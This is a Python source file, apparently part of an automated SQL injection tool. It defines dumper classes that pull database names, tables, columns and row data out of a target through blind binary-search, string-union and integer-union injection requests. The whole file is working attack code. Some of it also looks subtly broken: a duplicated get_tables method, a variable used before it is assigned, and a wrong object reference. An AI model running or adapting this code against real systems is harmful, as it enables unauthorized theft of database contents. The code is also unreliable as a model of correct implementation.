
from output import BlindSQLIOutput

class BlindDataDumper:

    def get_databases(self, mole, query_columns, injectable_field):
        count_fun = lambda x,y: mole._dbms_mole.schema_blind_count_query(x, y)
        length_fun = lambda x: lambda y,z: mole._dbms_mole.schema_blind_len_query(y, z, offset=x)
        query_fun = lambda x,y,z: mole._dbms_mole.schema_blind_data_query(x, y, offset=z)
        data = self._blind_query(mole, count_fun, length_fun, query_fun)
        return list(map(lambda x: x[0], data))

    def get_tables(self, mole, db, query_columns, injectable_field):
        count_fun = lambda x,y: mole._dbms_mole.table_blind_count_query(x, y, db=db)
        length_fun = lambda x: lambda y,z: mole._dbms_mole.table_blind_len_query(y, z, db=db, offset=x)
        query_fun = lambda x,y,z: mole._dbms_mole.table_blind_data_query(x, y, db=db, offset=z)
        data = self._blind_query(mole, count_fun, length_fun, query_fun)
        return list(map(lambda x: x[0], data))

    def get_columns(self, mole, db, table, query_columns, injectable_field):
        count_fun = lambda x,y: mole._dbms_mole.columns_blind_count_query(x, y, db=db, table=table)
        length_fun = lambda x: lambda y,z: mole._dbms_mole.columns_blind_len_query(y, z, db=db, table=table, offset=x)
        query_fun = lambda x,y,z: mole._dbms_mole.columns_blind_data_query(x, y, db=db, table=table, offset=z)
        data = self._blind_query(mole, count_fun, length_fun, query_fun)
        return list(map(lambda x: x[0], data))

    def get_fields(self, mole, db, table, fields, where, query_columns, injectable_field):
        count_fun = lambda x,y: mole._dbms_mole.fields_blind_count_query(x, y, db=db, table=table, where=where)
        length_fun = lambda x: lambda y,z: mole._dbms_mole.fields_blind_len_query(y, z, fields=fields, db=db, table=table, offset=x, where=where)
        query_fun = lambda x,y,z: mole._dbms_mole.fields_blind_data_query(x, y, fields=fields, db=db, table=table, offset=z, where=where)
        return self._blind_query(mole, count_fun, length_fun, query_fun)

    def get_dbinfo(self, mole, query_columns, injectable_field):
        count_fun = None
        length_fun = lambda x: lambda y,z: mole._dbms_mole.dbinfo_blind_len_query(y, z)
        query_fun = lambda x,y,z: mole._dbms_mole.dbinfo_blind_data_query(x, y)

        data = self._blind_query(mole, count_fun, length_fun, query_fun, row_count=1)
        if len(data) != 1 or len(data[0]) != 3:
            raise QueryError()
        return [data[0][0], data[0][1], data[0][2]]

    def find_tables_like(self, mole, db, table_filter, query_columns, injectable_field):
        print("[-] Not implemented!")

    def _blind_query(self, mole, count_fun, length_fun, query_fun, offset=0, row_count=None):
        mole.stop_query = False
        if count_fun is None:
            count = row_count
        else:
            count = self._generic_blind_len(
                mole,
                count_fun,
                lambda x: '\rTrying count: ' + str(x),
                lambda x: '\rAt most count: ' + str(x)
            )
            print('\r[+] Found row count:', count)
        results = []
        for row in range(offset, count):
            if mole.stop_query:
                return results
            length = self._generic_blind_len(
                mole,
                length_fun(row),
                lambda x: '\rTrying length: ' + str(x),
                lambda x: '\rAt most length: ' + str(x)
            )
            print('\r[+] Guessed length:', length)
            output=''
            if mole.stop_query:
                return results
            sqli_output = BlindSQLIOutput(length)
            gen_query_item = lambda i: self._blind_query_character(mole, query_fun, i, row, sqli_output)
            output = ''.join(mole.threader.execute(length, gen_query_item))
            if not mole.stop_query:
                sqli_output.finish()
            else:
                print('')
            results.append(output.split(mole._dbms_mole.blind_field_delimiter()))
        return results

    def _generic_blind_len(self, mole, count_fun, trying_msg, max_msg):
        length = 0
        last = 1
        while True and not mole.stop_query:
            req = mole.get_requester().request(
                mole.generate_url(
                    count_fun('>', last)
                )
            )
            print(trying_msg(last), end='')
            if mole.needle in mole.analyser.decode(req):
                break;
            last *= 2
        print(max_msg(str(last)), end='')
        pri = last // 2
        while pri < last:
            if mole.stop_query:
                return pri
            medio = ((pri + last) // 2) + ((pri + last) & 1)
            req = mole.get_requester().request(
                mole.generate_url(
                    count_fun('<', medio - 1)
                )
            )
            if mole.needle in mole.analyser.decode(req):
                pri = medio
            else:
                last = medio - 1
        return pri

    def _blind_query_character(self, mole, query_fun, index, offset, output=None):
        pri   = ord(' ')
        last  = 126
        index = index + 1
        while True:
            if mole.stop_query:
                return None
            medio = (pri + last)//2
            response = mole.analyser.decode(
                mole.requester.request(
                    mole.generate_url(query_fun(index, medio, offset))
                )
            )
            if mole.needle in response:
                pri = medio+1
            else:
                last = medio
            if medio == last - 1:
                output.set(chr(medio+1), index - 1)
                return chr(medio+1)
            else:
                if pri == last:
                    output.set(chr(medio), index - 1)
                    return chr(medio)
                else:
                    output.set(chr(medio), index - 1)

class StringUnionDataDumper:

    def get_databases(self, mole, query_columns, injectable_field):
        count_query = mole._dbms_mole.schema_count_query(query_columns, injectable_field)
        query_gen =  lambda x: mole._dbms_mole.schema_query(query_columns, injectable_field, x)
        return self._generic_query(mole, count_query, query_gen)

    def get_tables(self, mole, db, query_columns, injectable_field):
        count_query = mole._dbms_mole.table_count_query(db, query_columns, injectable_field)
        query_gen = lambda x: mole._dbms_mole.table_query(db, query_columns, injectable_field, x)
        return self._generic_query(mole, count_query, query_gen)

    def get_columns(self, mole, db, table, query_columns, injectable_field):
        count_query = mole._dbms_mole.columns_count_query(db, table, query_columns, injectable_field)
        query_gen = lambda x: mole._dbms_mole.columns_query(db, table, query_columns, injectable_field, x)
        return self._generic_query(mole, count_query, query_gen)

    def get_fields(self, mole, db, table, fields, where, query_columns, injectable_field):
        count_query = mole._dbms_mole.fields_count_query(db, table, query_columns, injectable_field, where=where)
        query_gen = lambda x: mole._dbms_mole.fields_query(db, table, fields, query_columns, injectable_field, x, where=where)
        return self._generic_query(mole, count_query, query_gen, lambda x: x)

    def get_dbinfo(self, mole, query_columns, injectable_field):
        query = mole._dbms_mole.dbinfo_query(query_columns, injectable_field)
        req = mole.get_requester().request(mole.generate_url(query))
        data = mole._dbms_mole.parse_results(mole.analyser.decode(req))
        if not data or len(data) != 3:
            raise QueryError()
        else:
            return data

    def find_tables_like(self, mole, db, table_filter, query_columns, injectable_field):
        count_query = mole._dbms_mole.tables_like_count_query(db, query_columns, injectable_field, table_filter)
        query_gen = lambda x: self._dbms_mole.tables_like_query(db, query_columns, injectable_field, table_filter, x)
        return self._generic_query(mole, count_query, query_gen)

    def _generic_query(self, mole,
                             count_query,
                             query_generator,
                             result_parser = lambda x: x[0]):
        req = mole.get_requester().request(mole.generate_url(count_query))
        result = mole._dbms_mole.parse_results(mole.analyser.decode(req))
        if not result or len(result) != 1:
            raise QueryError('Count query failed.')
        else:
            count = int(result[0])
            if count == 0:
                return []
            print('\r[+] Rows:', count, end='')
            dump_result = []
            mole.stop_query = False
            gen_query_item = lambda i: self._generic_query_item(mole, query_generator, i, result_parser)
            dump_result = mole.threader.execute(count, gen_query_item)
            dump_result.sort()
            return dump_result

    def _generic_query_item(self, mole,
                                  query_generator,
                                  offset,
                                  result_parser = lambda x: x[0]):
        if mole.stop_query:
            return None
        req = mole.get_requester().request(mole.generate_url(query_generator(offset)))
        result = mole._dbms_mole.parse_results(mole.analyser.decode(req))
        if not result or len(result) < 1:
            raise QueryError()
        else:
            return result_parser(result)

class IntegerUnionDataDumper:

    def get_databases(self, mole, query_columns, injectable_field):
        count_query = mole._dbms_mole.schema_integer_count_query(query_columns,
                                                                 injectable_field)
        length_query = lambda x: mole._dbms_mole.schema_integer_len_query(query_columns,
                                                                          injectable_field,
                                                                          offset=x)
        query_gen = lambda index, offset: mole._dbms_mole.schema_integer_query(index,
                                                                               query_columns,
                                                                               injectable_field,
                                                                               offset=offset)
        return self._generic_integer_query(mole, count_query, length_query, query_gen)

    def get_tables(self, mole, db, query_columns, injectable_field):
        count_query = mole._dbms_mole.table_integer_count_query(db,
                                                                query_columns,
                                                                injectable_field)
        length_query = lambda x: mole._dbms_mole.table_integer_len_query(db,
                                                                         query_columns,
                                                                         injectable_field,
                                                                         offset=x)
        query_gen = lambda index, offset: mole._dbms_mole.table_integer_query(index,
                                                                              db,
                                                                              query_columns,
                                                                              injectable_field,
                                                                              offset=offset)
        return self._generic_integer_query(mole, count_query, length_query, query_gen)

    def get_tables(self, mole, db, table, query_columns, injectable_field):
        count_query = mole._dbms_mole.columns_integer_count_query(db,
                                                                  table,
                                                                  query_columns,
                                                                  injectable_field)
        length_query = lambda x: mole._dbms_mole.columns_integer_len_query(db,
                                                                           table,
                                                                           query_columns,
                                                                           injectable_field,
                                                                           offset=x)
        query_gen = lambda index, offset: mole._dbms_mole.columns_integer_query(index,
                                                                                db,
                                                                                table,
                                                                                query_columns,
                                                                                injectable_field,
                                                                                offset=offset)
        return self._generic_integer_query(mole, count_query, length_query, query_gen)

    def get_fields(self, mole, db, table, fields, where, query_columns, injectable_field):
        count_query = mole._dbms_mole.fields_integer_count_query(db,
                                                                 table,
                                                                 query_columns,
                                                                 injectable_field,
                                                                 where=where)
        length_query = lambda x: mole._dbms_mole.fields_integer_len_query(db,
                                                                          table,
                                                                          fields,
                                                                          query_columns,
                                                                          injectable_field,
                                                                          offset=x,
                                                                          where=where)
        query_gen = lambda index, offset: mole._dbms_mole.fields_integer_query(index,
                                                                               db,
                                                                               table,
                                                                               fields,
                                                                               query_columns,
                                                                               injectable_field,
                                                                               offset=offset,
                                                                               where=where)
        data = self._generic_integer_query(mole, count_query, length_query, query_gen)

        return map(lambda x: x.split(mole._dbms_mole.blind_field_delimiter()), data)

    def get_dbinfo(self, mole, query_columns, injectable_field):
        query = mole._dbms_mole.dbinfo_integer_len_query(query_columns, injectable_field)
        req = mole.requester.request(mole.generate_url(req))
        length = mole._dbms_mole.parse_results(mole.analyser.decode(req))
        length = int(length)

        sqli_output = BlindSQLIOutput(length)
        query_gen = lambda index,offset: mole._dbms_mole.dbinfo_integer_query(index,
                                                                              query_columns,
                                                                              injectable_field)
        query_item_gen = lambda x: mole._generic_integer_query_item(query_gen,
                                                                    x,
                                                                    0,
                                                                    sqli_output)
        data = ''.join(mole.threader.execute(length, query_item_gen))
        sqli_output.finish()
        data = data.split(mole._dbms_mole.blind_field_delimiter())
        if not data or len(data) != 3:
            raise QueryError()
        else:
            return data

    def find_tables_like(self, mole, db, table_filter, query_columns, injectable_field):
        print("[-] Not implemented yet!")

    def _generic_integer_query(self, mole,
                                     count_query,
                                     length_query,
                                     query_generator,
                                     result_parser = lambda x: x[0]):
        req = mole.get_requester().request(mole.generate_url(count_query))
        result = mole._dbms_mole.parse_results(mole.analyser.decode(req))
        if not result:
            raise QueryError('Count query failed.')
        else:
            count = int(result[0])
            if count == 0:
                return []
            print('\r[+] Rows:', count, end='')
            dump_result = []
            mole.stop_query = False
            for i in range(count):
                req = mole.requester.request(mole.generate_url(length_query(i)))
                length = mole._dbms_mole.parse_results(mole.analyser.decode(req))
                length = int(length[0])
                sqli_output = BlindSQLIOutput(length)
                gen_query_item = lambda x: self._generic_integer_query_item(mole, query_generator, x, i, sqli_output)
                dump_result.append(''.join(mole.threader.execute(length, gen_query_item)))
                if not mole.stop_query:
                    sqli_output.finish()
            dump_result.sort()
            return dump_result

    def _generic_integer_query_item(self, mole, query_generator, index, offset, sqli_output):
        if mole.stop_query:
            return None
        req = mole.get_requester().request(mole.generate_url(query_generator(index+1, offset=offset)))
        result = mole._dbms_mole.parse_results(mole.analyser.decode(req))
        if not result or len(result) < 1:
            raise QueryError()
        else:
            result = chr(int(result[0]))
            sqli_output.set(result, index)
            return result

class QueryError(Exception):
    pass
